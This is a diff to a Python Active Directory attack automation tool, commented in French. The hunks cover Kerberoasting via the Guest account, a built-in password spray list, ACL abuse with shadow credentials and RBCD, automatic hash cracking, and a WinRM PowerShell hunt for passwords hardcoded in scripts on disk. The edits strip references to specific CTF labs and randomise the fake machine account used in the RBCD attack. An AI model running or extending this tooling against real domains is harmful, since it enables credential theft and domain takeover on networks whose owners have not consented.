@@ -723,7 +723,7 @@ def phase1_unauth(hosts, args, state):
         crack_hashes(args, state)
 
 def kerberoast_guest(args, state, dc):
-    """Kerberoast via Guest / compte anonyme (foothold sans creds valides, cf. Op. Endgame)."""
+    """Kerberoast via Guest / compte anonyme (foothold sans creds valides)."""
     if not args.domain:
         return
     nxc = nxc_bin()
@@ -801,7 +801,7 @@ def default_passwords(args):
         pw += [f"{s}{y}", f"{s}{y}!", f"{s}{y-1}", f"{s}{y-1}!"]
     comp = (args.domain or "").split(".")[0].capitalize()
     if comp:
-        pw += [f"{comp}123", f"{comp}123!", f"{comp}2024", f"{comp}2025!", f"{comp}@123"]
+        pw += [f"{comp}123", f"{comp}123!", f"{comp}{y}", f"{comp}{y}!", f"{comp}{y-1}!", f"{comp}@123"]
     pw += ["Password1", "Password1!", "Password123", "Welcome1", "Welcome123!",
            "Changeme123", "P@ssw0rd", "P@ssw0rd!", "Company123!"]
     return list(dict.fromkeys(pw))
@@ -1535,9 +1535,9 @@ def phase4_escalation(hosts, args, state):
 
     # 1) exploitation active des ACL abusables (shadow creds / RBCD / targeted roast)
     abuse_acl_paths(args, state, dc)
-    # crack immediat des hashes obtenus (ex: targeted kerberoast -> JERRI) -> nouveau cred
+    # crack immediat des hashes obtenus (ex: targeted kerberoast) -> nouveau cred
     crack_hashes(args, state)
-    # chasse de creds SUR LE DISQUE via WinRM (ex: syncer.ps1 -> SANFORD) -> Administrator
+    # chasse de creds planquees SUR LE DISQUE via WinRM (scripts/configs) -> nouvel acces
     hunt_disk_creds(args, state, dc)
 
     # 2) cartographie des creds -> hotes (admin local ?) + RCE + secretsdump
@@ -1616,8 +1616,8 @@ def _pot_paths():
 
 def _john_pot_lines(valid_users):
     """Lit john.pot (hash_complet:password) et garde les lignes de NOS users.
-    Comparaison INSENSIBLE A LA CASSE (le pot peut avoir 'cody_roy' et les users
-    'CODY_ROY' selon l'outil qui a genere le hash -> sinon on rate le cred)."""
+    Comparaison INSENSIBLE A LA CASSE (le pot peut avoir 'jdoe' et les users
+    'JDOE' selon l'outil qui a genere le hash -> sinon on rate le cred)."""
     out = []
     valid_lower = {v.lower() for v in valid_users} if valid_users else None
     for pot in _pot_paths():
@@ -1938,8 +1938,9 @@ _DISK_PS = ("Get-ChildItem C:\\ -Recurse -Include *.ps1,*.bat,*.cmd,*.vbs,*.conf
             "Get-Content $_.Path -ErrorAction SilentlyContinue }")
 
 def hunt_disk_creds(args, state, dc):
-    """Cherche des creds SUR LE DISQUE via WinRM (-x) : scripts/configs avec mdp en
-    dur (ex: syncer.ps1 -> SANFORD). Ce qu'un scanner classique ne fait pas."""
+    """Cherche des creds SUR LE DISQUE via WinRM (-x) : scripts/configs qui planquent
+    un mot de passe en dur (compte de service, tache planifiee, sync...). Ce qu'un
+    scanner classique ne fait pas : il faut executer du code sur l'hote pour lire C:\\."""
     nxc = nxc_bin()
     if not (nxc and _gate(args)):
         return
@@ -1989,7 +1990,9 @@ def abuse_rbcd(args, state, dc, target_computer):
                     f"addcomputer.py + rbcd.py -delegate-to {tname}$ -action write + "
                     f"getST.py -spn cifs/{tname} -impersonate Administrator")
         return
-    fake, fpass = "adhpc$", "Adhunt123!"
+    import secrets, string
+    fake = "wks-" + "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(6)) + "$"
+    fpass = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16)) + "aA1!"
     tgt, extra = impacket_creds(args)
     log(f"{C.R}{C.BD}[i] RBCD -> {target_computer} (addcomputer + rbcd + S4U)...{C.X}")
     if have("addcomputer.py"):
@@ -2331,7 +2334,7 @@ def main():
     p.add_argument("--relay", action="store_true",
                    help="Tenter coercion + ntlmrelayx (actif, requiert --yes + --lhost)")
     p.add_argument("--lhost", help="IP de l'attaquant (pour le relais NTLM)")
-    p.add_argument("--userlist", help="Liste d'utilisateurs a tester (seed phase 1 ; ex: userlist THM)")
+    p.add_argument("--userlist", help="Liste d'utilisateurs a tester (seed phase 1)")
     p.add_argument("--wordlist", help="Wordlist pour le crack auto (defaut: rockyou si present)")
     p.add_argument("--passwordlist", help="Wordlist de mots de passe pour le spray (defaut: liste integree)")
     p.add_argument("--crack-timeout", type=int, default=900, help="Timeout crack hashcat/john (defaut 900s)")
